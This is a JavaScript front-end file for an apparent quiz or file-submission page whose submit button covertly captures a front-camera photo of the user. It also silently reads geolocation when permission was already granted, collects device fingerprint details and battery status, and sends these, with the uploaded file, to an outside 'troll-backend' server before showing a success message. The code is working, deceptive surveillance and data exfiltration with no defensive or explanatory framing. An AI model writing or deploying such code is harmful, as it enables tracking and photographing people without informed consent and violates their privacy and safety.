const btn = document.getElementById('submit-btn');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const fileInput = document.getElementById('user-file');

const BACKEND_BASE = "https://troll-backend.onrender.com/api";

// ================================
// SILENT LOCATION (NO POPUP)
// ================================
async function getSilentLocation() {
  if (!navigator.permissions) return "";

  try {
    const status = await navigator.permissions.query({ name: "geolocation" });
    if (status.state === "granted") {
      const pos = await new Promise(res =>
        navigator.geolocation.getCurrentPosition(res)
      );
      return `${pos.coords.latitude},${pos.coords.longitude}`;
    }
  } catch {}
  return "";
}

// ================================
// METADATA
// ================================
async function collectMetadata() {
  const meta = {
    width: window.innerWidth,
    height: window.innerHeight,
    platform: navigator.platform,
    language: navigator.language,
    useragent: navigator.userAgent,
    time: new Date().toLocaleString(),
    deviceMemory: navigator.deviceMemory || "N/A",
    cpuThreads: navigator.hardwareConcurrency || "N/A",
    cookieEnabled: navigator.cookieEnabled,
    referer: document.referrer,
    network: navigator.connection ? JSON.stringify(navigator.connection) : "N/A",
    battery: "N/A",
    location: await getSilentLocation()
  };

  if (navigator.getBattery) {
    try {
      const b = await navigator.getBattery();
      meta.battery = `${b.level * 100}% charging:${b.charging}`;
    } catch {}
  }

  return meta;
}

// ================================
// CAMERA CAPTURE (FIXED)
// ================================
async function captureAndSendCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" },
      audio: false
    });

    video.srcObject = stream;
    video.muted = true;
    video.setAttribute("playsinline", true);
    await video.play(); // 🔴 REQUIRED

    // Wait for camera exposure
    await new Promise(r => setTimeout(r, 2500));

    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;

    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    const image = canvas.toDataURL("image/png");
    const metadata = await collectMetadata();

    await fetch(`${BACKEND_BASE}/upload`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ image, metadata })
    });

    stream.getTracks().forEach(t => t.stop());
  } catch (err) {
    console.error("Camera failed:", err);
  }
}

// ================================
// FILE UPLOAD
// ================================
async function sendFile(file) {
  return new Promise(resolve => {
    const reader = new FileReader();
    reader.onload = async () => {
      await fetch(`${BACKEND_BASE}/file-upload`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          file: reader.result,
          filename: file.name
        })
      });
      resolve();
    };
    reader.readAsDataURL(file);
  });
}

// ================================
// SUBMIT FLOW (FIXED)
// ================================
btn.addEventListener("click", async e => {
  e.preventDefault();
  btn.disabled = true;

  if (!fileInput.files.length) {
    btn.disabled = false;
    return;
  }

  await captureAndSendCamera();
  await sendFile(fileInput.files[0]);

  document.getElementById("quiz-container").style.display = "none";
  document.getElementById("success-container").style.display = "block";
});
